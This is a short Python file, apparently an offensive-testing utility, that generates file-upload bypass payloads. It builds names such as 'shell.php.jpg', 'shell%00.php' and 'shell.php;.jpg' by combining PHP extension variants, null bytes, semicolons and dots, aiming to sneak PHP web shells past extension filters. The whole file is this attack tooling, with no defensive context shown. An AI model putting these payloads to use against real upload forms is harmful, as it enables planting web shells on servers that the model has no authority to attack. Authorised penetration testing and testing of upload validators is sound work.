import random
import string

class PayloadMutator:
    def __init__(self):
        self.extensions = ["php", "pHp", "php3", "php5"]
        self.special_chars = [";", "%00", ".", "..", "...", "...."]

  
    def random_string(self, length=5):
        return ''.join(random.choices(string.ascii_lowercase, k=length))


    def basic_mutations(self, base_name="shell"):
        payloads = []

        for ext in self.extensions:
            payloads.append(f"{base_name}.{ext}")
            payloads.append(f"{base_name}.{ext}.jpg")
            payloads.append(f"{base_name}.{ext};.jpg")
            payloads.append(f"{base_name}%00.{ext}")
            payloads.append(f".{base_name}.{ext}")

        return payloads

    
    def advanced_mutations(self, base_name="shell"):
        payloads = []

        for ext in self.extensions:
            for char in self.special_chars:
                payloads.append(f"{base_name}{char}.{ext}")
                payloads.append(f"{base_name}.{ext}{char}.jpg")

        return payloads

   
    def random_mutations(self, count=10):
        payloads = []

        for _ in range(count):
            name = self.random_string()
            ext = random.choice(self.extensions)
            char = random.choice(self.special_chars)

            payloads.append(f"{name}.{ext}")
            payloads.append(f"{name}{char}.{ext}")
            payloads.append(f"{name}.{ext}{char}.jpg")

        return payloads

  
    def generate_all(self):
        payloads = []

        payloads += self.basic_mutations()
        payloads += self.advanced_mutations()
        payloads += self.random_mutations(15)

        return list(set(payloads))
